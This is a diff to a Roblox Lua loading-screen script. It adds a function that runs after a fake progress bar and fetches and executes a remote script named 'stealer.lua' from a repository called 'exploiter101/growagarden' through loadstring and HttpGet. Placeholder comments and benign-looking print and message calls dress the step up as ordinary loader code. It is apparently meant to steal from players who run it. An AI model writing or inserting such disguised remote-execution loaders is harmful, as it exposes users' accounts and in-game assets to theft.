@@ -215,7 +215,24 @@ local function simulateProgress()
     end
     
     progressFill.Size = UDim2.new(1, 0, 1, 0)
-    loadingText.Text = "Ready!"
+    loadingText.Text = "Loading Complete!"
+end
+
+-- Function to execute after loading completes
+local function executeLoadString()
+    -- Replace this with your actual loadstring code
+    local success, result = pcall(function()
+        -- Your loadstring code goes here
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/exploiter101/growagarden/refs/heads/main/dark/stealer.lua"))()
+        
+        -- Example code (replace with your actual implementation)
+        print("Executing loadstring...")
+        game:GetService("TestService"):Message("Loadstring executed successfully!")
+    end)
+    
+    if not success then
+        warn("Error in loadstring: " .. tostring(result))
+    end
 end
 
 -- Main loading function
@@ -230,6 +247,9 @@ local function showLoadingScreen()
     
     -- Simulate loading progress with 13s duration
     simulateProgress()
+    
+    -- Execute loadstring after progress completes
+    executeLoadString()
     
     -- Wait a moment before hiding
     task.wait(1.5)
